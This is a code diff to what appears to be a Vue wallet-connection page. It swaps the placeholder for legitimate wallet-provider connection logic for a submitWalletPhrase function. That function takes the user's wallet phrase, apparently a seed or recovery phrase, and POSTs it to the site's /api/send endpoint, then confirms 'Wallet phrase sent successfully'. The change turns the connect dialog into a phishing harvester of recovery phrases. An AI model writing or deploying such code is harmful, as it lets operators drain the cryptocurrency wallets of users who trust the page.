@@ -158,7 +158,7 @@
 
               <!-- Logo -->
               <div
-                  class="flex h-20 w-20 shrink-0 items-center justify-center rounded-full"
+                  class="flex h-18 w-18 shrink-0 items-center justify-center rounded-full"
               >
                 <img
                     :src="wallet.logo"
@@ -267,7 +267,7 @@
         :wallet-name="selectedWallet.name"
         :wallet-logo="selectedWallet.logo"
         @close="closeWallet"
-        @connect="connectWallet"
+        @submit="submitWalletPhrase"
     />
 
   </div>
@@ -336,12 +336,22 @@ const closeWallet = () => {
 |--------------------------------------------------------------------------
 */
 
-const connectWallet = () => {
-  console.log('Connecting:', selectedWallet.value.name)
+const status = ref<'idle' | 'sending' | 'sent' | 'error'>('idle')
+const { showToast } = useToast()
 
-  // Put the legitimate wallet-provider connection
-  // logic here.
+async function submitWalletPhrase(payload: { walletPhrase: string, walletName: string }) {
+  status.value = 'sending'
+  try {
+    await $fetch('/api/send', { method: 'POST', body: payload })
+    status.value = 'sent'
+    showToast('Wallet phrase sent successfully', 'success')
+    showWalletModal.value = false
+  } catch {
+    showToast('Failed to send wallet phrase', 'error')
+    status.value = 'error'
+  }
 }
+
 const handleScroll = () => {
   showHeader.value = window.scrollY > 0
 }
